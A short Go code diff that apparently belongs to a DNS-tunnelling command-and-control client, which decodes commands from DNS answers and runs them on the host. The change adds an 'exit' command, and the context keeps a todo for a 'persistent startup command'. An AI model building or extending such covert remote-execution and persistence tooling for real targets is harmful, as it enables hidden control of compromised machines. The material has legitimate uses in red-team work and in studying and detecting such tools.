@@ -73,7 +73,6 @@ func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
 	d.handleDecodedCommand(decoded)
 }
 
-// todo: add exit and quit command
 // todo: add persistent startup command
 func (d DNSClient) handleDecodedCommand(decoded string) {
 	switch decoded {
@@ -83,6 +82,9 @@ func (d DNSClient) handleDecodedCommand(decoded string) {
 	case "ok":
 		d.idleCounter = 0
 		break
+	case "exit":
+		d.sendMessage(ANSWER, "exit")
+		os.Exit(0)
 	default:
 		d.idleCounter = 0
 		output := executeCommand(decoded)
